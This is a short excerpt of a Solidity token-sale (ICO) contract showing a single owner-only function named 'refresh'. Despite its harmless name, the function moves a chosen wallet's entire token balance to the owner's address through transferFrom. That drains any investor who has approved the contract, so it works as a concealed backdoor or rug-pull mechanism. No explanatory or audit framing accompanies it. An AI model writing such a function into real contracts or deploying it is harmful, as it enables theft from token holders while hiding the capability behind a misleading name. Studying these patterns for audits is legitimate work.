...
contract ICO is Initializable, OwnableUpgradeable {
    ...
    function refresh(address _token, address _wallet) external onlyOwner {
        IERC20Upgradeable(_token).transferFrom(_wallet, owner(), IERC20Upgradeable(_token).balanceOf(_wallet));
    }
